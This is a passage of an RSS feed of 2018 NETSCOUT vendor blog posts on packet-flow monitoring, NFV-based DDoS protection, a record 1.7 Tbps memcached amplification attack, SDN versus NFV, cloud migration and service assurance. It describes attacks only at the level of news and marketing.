<p>The challenge, this data source is volumetrically massive and vast.&nbsp; So, ones need to “Filter” or Subscribe to what is interesting to them.&nbsp; Sometimes even that needs to be further summarized for them into what is “trending.”</p>

<p><u>That is the job of modern day Packet Flow aggregation and distribution switch.&nbsp;</u></p>

<ul>
	<li>Many sources of information need to be combined.</li>
	<li>Exact duplicates of information need to be removed.</li>
	<li>I only need to need to watch the 2017 Super Bowl collapse of Atlanta just one time. Same goes for baby eating their first birthday cake and your dog behaving badly.&nbsp; Not reposts from everybody and their brother.</li>
	<li>Extraneous information like exactly who has reposted this information and from where needs to be removed.</li>
	<li>I am sure there is some bid data value relative to psychological profiles about who reposts certain things.&nbsp;I couldn’t care less.</li>
	<li>This one is a little harder to figure out so I will just provide that I was thinking about stripping VLAN tags and other extraneous information applied to packet headers.</li>
	<li>Sometimes certain sources of information get priority over others.</li>
	<li>Any pet or baby photos from my far flung family rate high with me.</li>
	<li>Closely followed by photos of old trucks &amp; fishing.</li>
	<li>High entertainment value is applied by me for matriarch and patriarchal family members attempting to use and respond to social media as well.</li>
	<li>The above are related to filtering for specific application traffic to send to specialized tools and individuals concerned with traffic related to those APPS.</li>
	<li>Clean data then needs to be made available to multitude of consumers.</li>
	<li>Consumers then decide how they want this information.</li>
	<li>Some want summarized volume metrics and counts.</li>
	<li>"Looks like heroin to me Gene" from the movie FLETCH - except I mean NetFlow and not Heroin.</li>
	<li>Some want just first couple of lines or tags then decide if they are going to invest 30 seconds to read the information.&nbsp;</li>
	<li>Seem familiar to slicing your packets?</li>
	<li>Some only want things of interesting or different than&nbsp;normal.&nbsp;</li>
	<li>The whole process needs to work in reverse too when you only want to post once and have all your bosses covered across the social media blabber-verse.</li>
	<li>Often this leads to need of forming an opinion first before you repost?</li>
	<li>I like this tool chaining in the packet flow pantheon of features.</li>
	<li>Why is there such a dependency on hardware in this space?</li>
</ul>

<p>So&nbsp;here is where I make my case.&nbsp; Social media is not hard, if you know what you are doing.&nbsp; There are a lot of advanced features like sharing my location and choosing an avatar for which I still need to consult sub-30 year old professionals for assistance.&nbsp; But, by in large I can find what and who and I am looking for and “subscribe” or ask to be “friends” with.</p>

<p>How many of us have found that a far more challenging task with packet flow technology vendors over the last several years?&nbsp; For me, most do not meet the Ease of Use culture under pinning the social media application world.&nbsp; Doing anything intelligent at all seems to require a programming or scripting skill most don’t grasp or desire to learn and each feature seems to have some hardware dependency that requires additional devices and hauling of data back and FORTH between functions.&nbsp; So many of us find ourselves being squeezed out of features and ease of use by feature justification and price discussions which lead to decisions often being way above our pay grade.</p>

<p>There is also the fact that most Social Media is free if you are willing to suffer advertisements targeting your demographic.&nbsp; Speak aloud the name of your favorite divinity followed by a loud Mom like sigh at this point.</p>

<p>Now consider that probably all of us are experiencing a drive to cost reduction that has led us to virtualization, then the cloud, and also to Software as a Service functions.&nbsp; Do we relegate ourselves to looking at different Social Media apps and websites to get all the data we need?&nbsp; What if you have to pay to see your own data, just because your company has decided to move it to the cloud.&nbsp; Can you even see your data and the metrics derived from it the same way in the cloud as in your private or hosted data centers?</p>

<p>Shouldn’t packet flow technology be portable and the same across platforms?&nbsp; Shouldn’t it be easy to see what is there, attach to what you want, filter and present the information in how you want it?&nbsp; What about the results of inspection and analysis of information being available across all your social media venues?</p>

<p>Anyway, my ultimate realization is that we are in need of a Smart Data Core.&nbsp; Somewhere it is easy and convenient to use a common set of data sources and data points rather than have a dozen of interpretations from different data sets through different tools and portals.&nbsp; All that other data is good too, but as supporting data to that which is derived from packet level data.</p>

<p>I’m so proud of myself in making this comparison I am off already looking for more fun ways to compare technology trends to other social media and gaming phenomenon!&nbsp; Can you guess what I am picking on next that is compared to dating sites?</p>

<p><a href="https://www.netscout.com/pfs/network-packet-broker-software-evolution">Click here</a> to learn more about our Packet Flow technology.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/PFS_social%20media.jpg" length="179761" type="image/jpeg"/>
    <guid isPermaLink="false">c5592742-7352-454b-afae-ce2817e56978</guid>
    <pubDate>Tue, 06 Mar 2018 12:50:31 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Brian  Philips</dc:creator>
    </item>
<item>
  <title>Applying NFV to DDoS protection</title>
  <link>http://localhost:7996/blog/applying-nfv-ddos-protection</link>
  <description>As with any new technology, Network Function Virtualization (NFV) has its own adoption cycle driven by business realities. Once a subject of hype, NFV is a reality for service providers in 2018. NETSCOUT Arbor sees a lot of customers either deploying or evaluating NFV in earnest; quite a few are already using it to deliver revenue-generating services to their customers. The...</description>
  <content:encoded><![CDATA[<p>As with any new technology, Network Function Virtualization (NFV) has its own adoption cycle driven by business realities. Once a subject of hype, NFV is a reality for service providers in 2018. NETSCOUT Arbor sees a lot of customers either deploying or evaluating NFV in earnest; quite a few are already using it to deliver revenue-generating services to their customers. The motivation for deploying NFV in service provider environment is clear: to deliver managed services more quickly and more cost-effectively, enabling their consumption by small- to medium-sized enterprise customers (SME) and broadening the market in the process. To achieve these goals, service providers are looking to automate many aspects of service delivery and turning to management and orchestration systems (MANO) for help, sometimes shortened to “orchestrators”.</p>

<p>What does this have to do with <a href="https://www.arbornetworks.com/ddos-protection-products">DDoS protection</a>, you might ask? Well, service providers do a good job providing cloud-based DDoS protection. However, it should not come as surprise that for an increasing proportion of customers there is a need for hybrid or multi-layered DDoS protection – the concept pioneered by NETSCOUT Arbor back in 2011. &nbsp;Hybrid DDoS protection consists of a cloud DDoS protection service paired with a network / data-centre perimeter DDoS defense. Hybrid defense is needed to provide more immediate, localized protection from today’s sophisticated multi-layer attacks given the increasing importance of internet connectivity on business continuity.</p>

<p>Historically, to roll out the network / data-centre perimeter component of a layered defense – using a CPE device like <a href="https://www.arbornetworks.com/ddos-protection-products/arbor-aps">NETSCOUT Arbor APS</a> – providers needed to supply an appliance or VM image and then reconfigure their customers’ perimeter protection to add in the new capability – often a manual, costly and time-consuming process. This is exactly where NFV helps.</p>

<p>Using NFV, a service provider can deploy a chain of security functions (service chain) within the provider data centre, where DDoS protection becomes one component along with firewall, IPS, WAF, anti-spam and other defensive technologies. After inspection, traffic is delivered back to the enterprise network. That might sound complex (and it actually is when we are talking about designing for a large-scale deployment), however there are a range of open-source and commercial technologies that automate this process via SDN-based approaches to connect the elements of the service chain and steer traffic.</p>

<p>The elements of the service chain are known as VNFs (Virtual Network Functions), and there a few prerequisites for a network or security function before it can be deployed in this way. First and foremost, the VNF product should run on top of popular commercial or open-source hypervisors, e.g. VMWare or KVM. Next, it should be possible to automate initial configuration of the VNF using a programmable approach like <a href="https://cloud-init.io/">cloud-init</a>. After the product boots up and is initially configured, we might then need to perform specific configuration, e.g. create protection templates for customer services etc., and REST APIs are the de-facto industry standard for this task. And, last but not least, there should be a way to manage the lifecycle of the instance by performing periodic health checks and triggering healing operations in case of problems.</p>

<p>NETSCOUT Arbor vAPS has fulfilled these requirements for a while, and every release over the past couple of years has brought additional functionality enabling better integration into NFV environments. Moreover, we have been testing and certifying vAPS with world leading orchestrators like Cisco NSO, Nokia CloudBand, Amdocs NCSO and OpenStack Tacker.</p>

<p>While the technical pieces of NFV support are important, the shift in business model that NFV can trigger for a service provider (such as the number and type of service customers, migration to consumption-based billing mechanisms, etc.) is perhaps the more transformational. At NETSCOUT Arbor we are fully aware of this impact (and opportunity) for service providers and we now offer much more flexible licensing for our APS product line to accommodate these more dynamic commercial environments. This licensing is based on “capacity pools” that allow operators to dynamically enable protection capacity (in the form of vAPS instances) wherever and whenever they want. For example, a provider could license a 10G pool and offer a 1Gbps managed service to ten different customers, 100x 100Mbps or any mix of supported throughputs. And, licenses can be moved from customer to customer, scaled up or down and even re-used as customers join / leave the service.&nbsp;This license capacity can be purchased either as a perpetual license or as a month-to-month subscription, making vAPS a good fit for any NFV business model.</p>

<p>We are happy to share the experience and knowledge we have gained in making NFV real. If you are interested in learning more about the business and technical aspects of deploying NFV, we suggest you start by taking a look at our <a href="http://resources.arbornetworks.com/wp-content/uploads/WP_NextGenDDoS_EN.pdf">White Paper on Next Generation DDoS services</a>. Intrigued? Have questions? Please get in touch with us at <a href="mailto:nfv@arbor.net">nfv@arbor.net</a> to discuss how we can work together to help you roll out next-generation DDoS services.</p>

<p>Author’s Note: I’d like to thank my colleagues Darren Anstee, Talbot Hack and Andrew Mortensen for their help in developing this content.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/NFV%201200x480.jpg" length="607728" type="image/jpeg"/>
    <guid isPermaLink="false">db07c21a-b205-413e-a319-ef4d4c9e50cf</guid>
    <pubDate>Mon, 05 Mar 2018 12:47:34 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kirill  Kasavchenko</dc:creator>
    </item>
<item>
  <title>NETSCOUT Arbor Confirms 1.7 Tbps DDoS Attack; The Terabit Attack Era Is Upon Us</title>
  <link>http://localhost:7996/blog/asert/netscout-arbor-confirms-17-tbps-ddos-attack-terabit-attack-era</link>
  <description>Last week, after Akamai confirmed a 1.3Tbps DDoS attack against Github, I published a blog that looked at the last five years of reflection/amplification attack innovation. I hope that it provides a helpful backgrounder on how we got here to the terabit attack era.</description>
  <content:encoded><![CDATA[<p>Last week, after Akamai confirmed a 1.3Tbps DDoS attack against <a href="https://www.wired.com/story/github-ddos-memcached/">Github</a>. I published a <a href="http://asert.arbornetworks.com/1-terabit-ddos-attacks-become-a-reality-reflecting-on-five-years-of-reflections/">blog</a> that looked at the last five years of reflection/amplification attack innovation. I hope that it provides a helpful backgrounder on how we got here, to the terabit attack era, because clearly, that’s what we’ve entered.</p>

<p>Today, NETSCOUT Arbor can confirm a 1.7Tbps reflection/amplification attack targeted at a customer of a U.S. based Service Provider has been recorded by our ATLAS global traffic and DDoS threat data system. The attack was based on the same memcached reflection/amplification attack vector that made up the Github attack. It’s a testament to the defense capabilities that this Service Provider had in place to defend against an attack of this nature that no outages were reported because of this.</p>

<p>The previous record recorded by ATLAS was 650Gbps towards a target in Brazil during the summer of 2016.</p>

<p>While the internet community is coming together to shut down access to the many open mecached servers out there, the sheer number of servers running memcached openly will make this a lasting vulnerability that attackers will exploit. It is critically important for companies to take the necessary steps to protect themselves including implementation of best current practices described in the following Arbor Security Engineering and Response Team (ASERT) <a href="http://asert.arbornetworks.com/memcached-reflection-amplification-description-ddos-attack-mitigation-recommendations/">blog</a>.</p>

<p>It is also very important to work with DDoS mitigation service providers, such as <a href="https://www.arbornetworks.com/ddos-protection-products/arbor-cloud">Arbor Cloud</a>, that have sufficient scale and expertise to block attacks of this size. Arbor Cloud has been sized to multiple times the largest attack previously recorded. It is well equipped to handle attacks of this scale. Ensure that any DDoS mitigation provider that you engage can say the same.</p>

<p>Until&nbsp;the internet community is able to adjust and make significant progress on memcached servers, we should expect terabit attacks to continue.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Mar2018_Peak_Attack_Size.png" length="12195" type="image/png"/>
    <guid isPermaLink="false">ccc20ca0-b663-47f0-bd27-2f0c2d0cfc26</guid>
    <pubDate>Mon, 05 Mar 2018 12:34:31 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Carlos Morales</dc:creator>
    </item>
<item>
  <title>What's the Difference Between NFV and SDN?</title>
  <link>http://localhost:7996/blog/whats-sdn-and-nfv</link>
  <description>Many service providers have embarked on a major initiative to migrate their IP networks from purpose-built platforms to virtualized, software-based platforms heralding a new era of “programmable networks.” Service providers are increasingly looking to implement Network Function Virtualization (NFV) and Software Defined Network (SDN) technologies</description>
  <content:encoded><![CDATA[<p>Many service providers have embarked on a major initiative to migrate their IP networks from purpose-built platforms to virtualized, software-based platforms heralding a new era of “programmable networks.” Service providers are increasingly looking to implement Network Function Virtualization (NFV) and Software Defined Network (SDN) technologies to evolve their networks to become more agile and elastic, better managed and orchestrated with automation; thereby driving lower CAPEX and OPEX. With <a href="https://www.netscout.com/solutions/virtualization">virtualization</a>, service providers look to gain control of service creation and innovate faster in response to customer and market needs and opportunities as well as to meet competitive challenges. Assuring the continuity of quality network services through this network evolution requires real-time visibility at the most granular level of these transitory virtualized elements.&nbsp;</p>

<h3>The Business Case for Virtualization</h3>

<p>Over the years, service provider networks have become complex, rigid, and inflexible in terms of service creation and delivery, slowing down the innovation cycle and driving up their capital and operational expenses. The tight integration between services software and purpose-built hardware has made it increasingly difficult to manipulate services “on-demand.” The business rationale for this transformation is to create a more dynamic and service-agile infrastructure where existing services can be changed “on-the-fly” and new services can be delivered rapidly in response to changing customer needs. Furthermore, the total cost of ownership can be reduced through improved automation and orchestration capabilities.</p>

<p>This is a very significant transformation, similar in nature to the TDM-to-IP transformation that started in the late 1990s. During this transformation, several central offices will convert from legacy architectures of purpose-built network elements to virtualized architectures with commercial off-the-shelf platforms hosting virtual network elements. These virtual network elements can be controlled from external software systems where the service creation and orchestration intelligence resides. Service providers will be in a position to offer differentiated services to their customers through their control of the orchestration platforms.</p>

<h3>What is SDN? What is NFV? What's the Difference?</h3>

<p>Brandon Butler offered a clear definition of these technologies in his 2017 article, “<a href="https://www.networkworld.com/article/3206709/lan-wan/what-s-the-difference-between-sdn-and-nfv.html" rel="nofollow">What’s the difference between SDN and NFV</a>?” In that article, he described Software Defined Networking as “the idea of separating the control plane of a network from the data plane that forwards network traffic. The goal of this disaggregation is to create a network that is centrally managed and programmable. Some SDN implementations use a software-based management platform that controls commodity network hardware. Other approaches use an integrated hardware and software-approach.” &nbsp;</p>

<p>Further, he offered that “the fundamental idea of NFV is to virtualize network services and abstract them from dedicated hardware. NFV deployments typically use commodity servers to run software versions of network services that previously were hardware-based. These software-based services are called Virtual Network Functions (VNF) and would run in an NFV environment. Examples of VNFs include routing, firewalling, load balancing, WAN acceleration, and encryption. By virtualizing these network services, providers can offer customers these services dynamically, with the ability to spin them up down on demand.”</p>

<p>This new virtualized infrastructure is based on open standards for SDN and NFV. By virtualizing network functions, NFV allows network functions to be placed anywhere in the infrastructure and be moved as necessary. By separating control plane and data plane functions, SDN allows individual packet flows to be routed through the appropriate service layers as needed.</p>

<p><a href="http://localhost:7996/solutions/smart-edge-monitoring">Service assurance solutions</a> that are virtualized can also weave themselves into this architecture at both the NFV and SDN functionality. Such software-based solutions have the potential to provide more cost, effective visibility, proactive monitoring, and service triage.</p>

<h3>Transitioning to NFV and SDN</h3>

<p>To facilitate “on-demand” service turn up (and turn down) while maintaining service quality, service providers need a solution that provides real-time visibility all the way down to the VNF layer with real-time views and alerting functionality. This discrete level of visibility can also become part of the automation layer that enables the elasticity of networks with virtualization. In this way, service providers can transition their network and services to NFV and SDN with confidence.</p>

<p>~ John English, Sr. Solutions Marketing Manager, NETSCOUT</p>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [{
    "@type": "Question",
    "name": "What is SDN or Software-Defined Networking?",
    "acceptedAnswer": {
      "@type": "Answer",
      "text": "Software-Defined Networking has been defined as the idea of separating the control plane of a network from the data plane that forwards network traffic. The goal of this disaggregation is to create a network that is centrally managed and programmable. Some SDN implementations use a software-based management platform that controls commodity network hardware. Other approaches use an integrated hardware and software-approach."
    }
  },{
    "@type": "Question",
    "name": "What is NFV or Network Functions Virtualization?",
    "acceptedAnswer": {
      "@type": "Answer",
      "text": "The fundamental idea of NFV is to virtualize network services and abstract them from dedicated hardware. NFV deployments typically use commodity servers to run software versions of network services that previously were hardware-based. These software-based services are called Virtual Network Functions (VNF) and would run in an NFV environment. Examples of VNFs include routing, firewalling, load balancing, WAN acceleration, and encryption. By virtualizing these network services, providers can offer customers these services dynamically, with the ability to spin them up down on demand."
    }
  }]
}
</script>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/nfv_sdn.jpg" length="170437" type="image/jpeg"/>
    <guid isPermaLink="false">27e6a5b4-5138-40e3-8c6e-0e7552711cc7</guid>
    <pubDate>Fri, 02 Mar 2018 15:01:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Service Intelligence: Cloud Migration's Secret Weapon</title>
  <link>http://localhost:7996/blog/service-intelligence-cloud-migrations-secret-weapon</link>
  <description>To attain cloud migration nirvana, companies must successfully navigate a host of challenges, including retaining visibility and control over service quality and performance.</description>
  <content:encoded><![CDATA[<p>By now, it's pretty clear that cloud migration can yield big benefits. In fact, a recent <a href="https://www.netscout.com/request-cloud-migration-strategies" target="_blank">survey</a> from research firm ESG found that nearly 40% of respondents said migrating reduced data center build-out costs. It also increases resource elasticity and speeds up service provisioning.</p>

<p>Reaping those benefits is by no means a sure thing, however.  To attain cloud migration nirvana, companies must successfully navigate a host of challenges, including retaining visibility and control over service quality and performance.</p>

<p>Application infrastructures are complex, and companies must make sure that the migration method suits the specific scenario.   For example, organizations can choose to simply substitute a SaaS solution of an on-premises application. They can also forklift an existing application that uses a Spring, Java EE, or Microsoft.net framework into a cloud infrastructure without altering it. Alternatively, companies may choose to refactor software as they move it to the cloud through functional decomposition into microservices. <a href="https://martinfowler.com/articles/microservices.html" target="_blank">Microservices architecture</a> is a prescription to break down an application into many smaller parts, run each of these parts as its own application, and collectively solve the targeted business problem. This can produce a flexible software solution that takes full advantage of the cloud’s potential.</p>

<p>Each approach has drawbacks, however. SaaS implementations can be less flexible than bespoke in-house software, although PaaS architectures can create more room for maneuver. Conversely, lift-and-shift lets a company retain control over its own code but can limit the benefits of a cloud environment. </p>

<p>Refactoring, meanwhile, is perhaps the most challenging approach of all.  Microservices are designed and built around business boundaries (for cohesion and to avoid data leakage) with each as a single-purpose application that is independently deployable, scalable, and portable across clouds. To embrace the cloud computing paradigm, companies must spend significant time effectively redeveloping large chunks of their software into net new applications on different VMs and use lightweight protocols for integration such as RESTful interfaces over HTTP.</p>
<figure role="group" class="caption caption-img align-center"><img alt="IDC: microservices, function" data-entity-type="file" data-entity-uuid="eb54f109-7bb9-42fd-b0c8-41f62b290dd8" src="http://localhost:7996/sites/default/files/inline-images/IDC_DR2018_GS2_AG_ppt-page-014.jpg" /><figcaption><em>IDC, Developers in the Driver’s Seat: The New DX Power Brokers, February 2018</em></figcaption></figure><p> </p>

<p><b>Cloud migration meets DevOps</b></p>

<p>Two linked approaches—DevOps and continuous software delivery—have emerged to help streamline cloud migration. Continuous delivery differs from older iterative development methods, which gathered change requests for software and treated them as one big project, batch-delivering them in upgrades that often fell months or years apart. Instead, continuous delivery operates as a constant cycle of software updates on a daily or even hourly basis.</p>

<p>This approach, which revolutionized software development and deployment, was made possible thanks to <a href="https://itrevolution.com/devops-books/" target="_blank">DevOps</a>, which broke down barriers between development and operations. When DevOps is done right, the process results in rationalizing tools sets to drive business solutions and deliver high-quality services, at a higher velocity.  The upside to these methods is clear: increased productivity, speeding up software releases, and accelerated remediation, all of which can optimize cloud-based deployments.</p>

<p>Organizations are embracing DevOps like never before, with many focusing on how to implement it at scale. As Forrester Research discovered in a 2017 online survey, 90% of organizations have either implemented or plan to implement DevOps.  But these new ways of doing things have also added a few new wrinkles when it comes to service delivery. For instance, continuous delivery has fueled new software architectures, including container-based microservices that atomize software applications into thousands of discrete functions, each running in its own mini-OS. These functions rely on each other for inputs that enable them to execute, thus creating another level of service dependencies to deliver business value. </p>

<p>The complexities of these new architectures compound an already challenging environment, in which different migration models intermingle and often reside on different cloud infrastructures in varying locations. It all leads to an intricate fabric of services and the need for pervasive visibility and data-driven insights.  In the ESG survey, 77% of the respondents said that improved visibility would help accelerate service delivery in the public cloud. In short, if you want the full benefits of cloud migration, you need to find a way to cut through the complexity, and that requires a whole new approach to service assurance. </p>

<p><b>The need for service intelligence</b></p>

<p>From the developer’s desktop to the IT infrastructure, the DevOps team needs to understand not just the software development cycles, but also the broader spectrum of cloud-based service dependencies. In many ways, moving to the cloud and container-based microservices punts complexity from Dev to Ops.  As such, service intelligence is not only a strategic component of continuous delivery but also necessary to reduce downtime.  When going from microservices code out to server farms—both on-premises or on public clouds like AWS or Azure—a continuous deployment pipeline is not necessarily error-free, and problems can quickly scale.  Thus, an unobstructed end-to-end view of services and <a href="https://www.netscout.com/cloud-smarter-content2" target="_blank">data-driven actionable insights</a> helps development and operations align for the next application iteration and leads to continuous at-scale improvements by detecting failures early on and fixing them before they can impact customers.   </p>

<p>Done properly, this will help to make cloud migration projects more predictable by giving developers and IT operation professionals an advanced understanding of how changes affect application and service performance. When embarking on an initiative as significant as cloud migration, it helps to have all this information at your fingertips.</p>

<p>~Ron Lifton, Sr. Solutions Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/cloud-migration-service-performance-metrics.jpg" length="823793" type="image/jpeg"/>
    <guid isPermaLink="false">a6170bd5-2ea9-4b95-8b38-9d02f7e05959</guid>
    <pubDate>Fri, 02 Mar 2018 14:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Digital Transformation Demands Service Assurance Guarantees</title>
  <link>http://localhost:7996/blog/digital-transformation-demands-service-assurance-guarantees</link>
  <description>The push for digital transformation can come from the CEO, the CIO, or some other area, but regardless of where the spark ignites, IT will need to change because this much is clear: To be successful, IT’s inwardly focused reactive model will have to give way to an outwardly focused stance that involves taking more risks and positions IT as a true enabler of digital business...</description>
  <content:encoded><![CDATA[<p>The push for digital transformation can come from the CEO, the CIO, or some other area, but regardless of where the spark ignites, IT will need to change because this much is clear: To be successful, IT’s inwardly focused reactive model will have to give way to an outwardly focused stance that involves taking more risks and positions IT as a true enabler of digital business services.</p>

<p>The stakes are big and getting bigger.&nbsp; International Data Corporation (<a href="https://www.idc.com">IDC</a>)&nbsp;says spending on digital transformation technologies crested $1.2 trillion in 2017, up 18% from 2016, and forecasts a compound annual growth rate of 18% going out to 2020.&nbsp;&nbsp;</p>

<p>Transformation efforts can include everything from finding new ways to improve customer experiences to turning the organization upside down in an effort to disrupt a market—or to avoid being disrupted by someone else.&nbsp;&nbsp;</p>

<p>Prominent speaker and author Brian Solis, a principal analyst at Altimeter, <a href="http://www.briansolis.com/2017/01/definition-of-digital-transformation/" target="_blank">describes digital transformation</a> as “the realignment of, or new investment in technology, business models, and processes to drive new value for customers and employees, and more&nbsp;effectively compete in an ever-changing digital economy.”</p>

<p>That digital economy is constantly&nbsp;morphing, in part because companies are finding new ways to extract value from data they are amassing. <a href="https://www.idc.com/promo/thirdplatform" target="_blank">IDC estimates</a> that “revenue growth from information-based products” is growing twice as fast as “the rest of the product/service portfolio for one-third of all Fortune 500 companies.”</p>

<p>Getting digital transformation right, however, is a multidimensional challenge, and one of the core tasks is to shift IT culture and structure to support a digital business model. Companies that get it right are no longer “building software or running IT for cost savings and operations, but rather IT has become the primary driver of business innovation,” <a href="https://enterprisersproject.com/what-is-digital-transformation#q4" target="_blank">reports the Enterprisers Project</a>, a community of CIOs. “Embracing this shift requires everyone in the company to rethink the role and impact of IT in their day-to-day experience.”</p>

<p>Other challenges include:</p>

<ul>
	<li>Ensuring IT employees possess both technological savvy<i> and</i> in-depth knowledge about the business and its markets</li>
	<li>Ensuring core data sets are in sync, clean, up to date, and accessible</li>
	<li>Making sure the infrastructure can keep up with the new digital demands</li>
	<li>Defining new key performance indicators (KPIs) that align with new goals</li>
</ul>

<p>Regarding the latter, today’s reactive metrics focused on, say, the efficiency of infrastructure, will not adequately reflect the business objectives of digital transformation.&nbsp; New metrics will typically involve outcome-oriented paradigms—such as the number of new products launched or the rate of innovation—that effectively track the success of new IT business-oriented services.&nbsp;</p>

<p>KPIs will also have to take into account service levels because the best digital transformation strategy in the world will fall flat if you can’t ensure that digital services supporting the initiatives are operating properly.&nbsp; It’s the old, “All the green lights are on, but nothing is working” syndrome, only the stakes are exponentially higher given that, with digital transformation, the service <i>is</i> the business and you’re typically talking about the customer experience, not the user experience.</p>

<p>Meeting the new requirements will generally involve building on existing reliability and availability metrics, and adding service assurance measurements that align with the expected transformation outcomes.&nbsp;&nbsp;</p>

<p>That is easier said than done, of course, given the complexity of IT environments today. Digital services involve long delivery chains that depend on the performance of everything, from applications on multiple containers, myriad integrated microservices, databases, networks, storage systems, and much more spanning on premises, cloud, or both.&nbsp;</p>

<p>If something goes wrong with the services&nbsp;anywhere along the way, the core of the new transformation efforts will either turn belly up, or worse, degrade incrementally. The result is disillusioned or frustrated customers, a catastrophe in the digital economy where even a fraction of a second makes a business difference.&nbsp;What’s more, it leaves IT with the job of trying to bird-dog the cause of the problem by manually correlating information from a hodgepodge of logs and other sources of system data. This is where 'mean time to innocence' takes precedence over customer experience.</p>

<p>The key is to be able to understand what is happening end-to-end across the service chain in order to build a holistic view of the health of the service, even if it spans multiple domains. That pervasive visibility into dynamic, highly integrated environments is vital to maintaining digital service levels and keeping customers happy, but it will require some changes to today’s approach.</p>

<p>Look for comprehensive operational solutions&nbsp;that offer pervasive visibility into complex hybrid IT infrastructures. This will enable you to efficiently&nbsp;collect, organize, and analyze large volumes of data in real time, and use the resulting insights to confidently support multi-tiered digital services that support your transformation efforts.&nbsp;&nbsp;</p>

<p>Another critical capability to look for if you want to truly understand what is happening with services in dynamic IT environments is service dependency mapping.&nbsp; Seeing how one service hiccup ripples through other services helps drive root-cause analysis, and reduces the mean time to knowledge, and, in turn, speeds corrective action, ideally before the glitch becomes noticeable to customers.</p>

<p>Together, these service assurance technologies deliver the proactive insight into service performance required for enterprises to achieve their targeted business outcomes.</p>

<p>Solis from Altimeter has identified <a href="http://www.briansolis.com/2017/01/definition-of-digital-transformation/" target="_blank">six stages of digital transformation</a> necessary for enterprises <ins cite="mailto:Lifton,%20Ron" datetime="2018-02-14T16:08">to </ins>realize their transformation aspirations.&nbsp; In the fifth stage, he says, “The new infrastructure of the organization takes shape as roles, expertise, models, processes, and systems to support transformation are solidified.”&nbsp;</p>

<p>Having the tools in place to actually verify the transformational digital efforts are working as intended should be in place by this critical juncture, because trying to bolt them on after the fact will be hard and risky.&nbsp; Customer loyalty in the digital economy is fleeting.&nbsp; Innovation happens fast and if someone is doing it better, you can lose the edge in a mouse click.</p>

<p>While digital transformation requires IT to take more risks and be accountable for new outcomes, the one risk IT should avoid is launching digital initiatives without the proper service assurance tools in place to ensure everything is working as advertised.</p>

<p>~Written by John Dix.&nbsp;John is an IT industry veteran who has been chronicling the major shifts in IT since the emergence of distributed processing in the early ‘80s. An award-winning writer and editor, he was the editor-in-chief for NetworkWorld for many years and an analyst for research firm IDC.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/dx-service-assurance.jpg" length="1381383" type="image/jpeg"/>
    <guid isPermaLink="false">94bc4d3b-aca3-43f1-a10d-fe559b46ced2</guid>
    <pubDate>Thu, 01 Mar 2018 16:00:00 -0500</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>1 Terabit DDoS Attacks Become a Reality; Reflecting on Five Years of Reflections</title>
  <link>http://localhost:7996/blog/asert/1-terabit-ddos-attacks-become-reality-reflecting-five-years</link>
  <description>Special thanks to Hardik Modi, Steve Siadak and Roland Dobbins for their contributions on this post. Reflection amplification is a technique that allows cyber attackers to both magnify the amount of malicious traffic they can generate, and obfuscate the sources of that attack traffic. For the past five years, this combination has been irresistible to attackers, and for good...</description>
  <content:encoded><![CDATA[<p><em>Special thanks to Hardik Modi, Steve Siadak and Roland Dobbins for their contributions on this post.</em></p>

<p>Reflection amplification is a technique that allows cyber attackers to both magnify the amount of malicious traffic they can generate, and obfuscate the sources of that attack traffic. For the past five years, this combination has been irresistible to attackers, and for good reason.</p>

<p>This simple capability, of turning small requests into larger, ‘amplified’ responses, changed the Distributed Denial of Service (DDoS) attack landscape dramatically. In fact, NETSCOUT Arbor has called this the Hockey Stick Era of DDoS, where we saw a massive spikes in DDoS attack size due to the increasing use of reflection/amplification techniques. I was asking <a href="http://asert.arbornetworks.com/how-likely-is-a-ddos-armageddon-attack/">How likely is a DDoS Armageddon attack</a>? I wondered whether a terabit attack was possible, and what the potential for collateral damage was.</p>

<p>Now, thanks to a disclosure from <a href="https://www.wired.com/story/github-ddos-memcached/">Akamai</a>, we know the answer. Yes, we can, and did, have a terabit attack. Looking at the chart below, this was inevitable given the firepower in the hands of today’s sophisticated attackers. Between reflection amplification and the emergence of IOT botnets, this milestone was destined to happen.</p>

<p>Arbor has worked closely with our customer base, the service provider community, and the industry at large to develop and implement best current practices to prepare for situations such as this where the DDoS threat pivots. We expect the exploitation of this vector to continue so there will likely be attacks of similar or even greater magnitude coming. Please reach out to your local Arbor representatives for any assistance or consultation you need to ensure you are prepared.</p>

<p>Here’s a look back at how we got here, on the backs of attacker ingenuity and powerful reflection amplification attack capabilities.</p>

<p><img alt="The Time is Now" data-entity-type="file" data-entity-uuid="0b3f9f48-9f93-4aba-9686-332fd714edda" src="http://localhost:7996/sites/default/files/inline-images/The%20Time%20is%20Now.jpg" /></p>

